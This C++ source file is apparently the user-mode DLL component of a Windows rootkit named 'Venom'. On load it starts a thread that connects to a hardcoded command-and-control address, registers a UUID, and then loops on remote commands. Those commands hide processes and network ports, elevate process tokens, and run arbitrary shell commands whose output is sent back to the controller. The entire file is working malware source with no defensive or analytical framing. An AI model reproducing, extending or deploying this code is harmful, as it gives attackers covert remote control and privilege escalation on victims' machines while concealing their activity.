#include "CommunicationHandler.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include "../VenomRootkit/Ioctl.h"
#include "VenomCommands.h"
#include "Utils.h"

extern "C" __declspec(dllexport)
DWORD WINAPI VenomThread(LPVOID lpParam)
{
	VenomCommands::Command recievedCommand = { 0 };
	CommunicationHandler::Communicator cncCommunicator("192.168.1.163", 8888);
	if (cncCommunicator.connectToCnc())
	{
		auto uuid = Utils::generateUUID();
		cncCommunicator.sendDataToCnc(uuid.c_str());

		auto status = 0;

		while (true)
		{
			cncCommunicator.pullCommand(&recievedCommand);

			switch (recievedCommand.commandType)
			{

			case VenomCommands::CommandTypes::HideProcess:
				status = VenomCommands::hideProcess(strtoul(recievedCommand.data, NULL, 0));
				if( 0 != status) { cncCommunicator.sendDataToCnc("Successfully hidden process\n"); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to hide process\n"); }
				break;

			case VenomCommands::CommandTypes::HidePort:
				status = VenomCommands::hidePort((USHORT)strtoul(recievedCommand.data, NULL, 0));
				if (0 != status) { cncCommunicator.sendDataToCnc("Successfully hidden port\n"); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to hide port\n"); }
				break;

			case VenomCommands::CommandTypes::ElevateToken:
				status = VenomCommands::elevateToken(strtoul(recievedCommand.data, NULL, 0));
				if (0 != status) { cncCommunicator.sendDataToCnc("Successfully elevated token\n"); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to elevate token\n"); }
				break;

			case VenomCommands::CommandTypes::ExecuteCommand:
				const char* commandOutput = (const char*)malloc(VenomCommands::commandOutputBufferLength);
				status = VenomCommands::executeCommand(recievedCommand.data, commandOutput);
				if (0 == status) { cncCommunicator.sendDataToCnc(commandOutput); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to execute command\n"); }
				break;
			}

			if(recievedCommand.size > 0)
				free(recievedCommand.data);

			memset(&recievedCommand, 0, sizeof(VenomCommands::Command));
		}
	}
	cncCommunicator.disconnectFromCnc();

	return 0;
}

extern "C" __declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, VenomThread, NULL, NULL, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}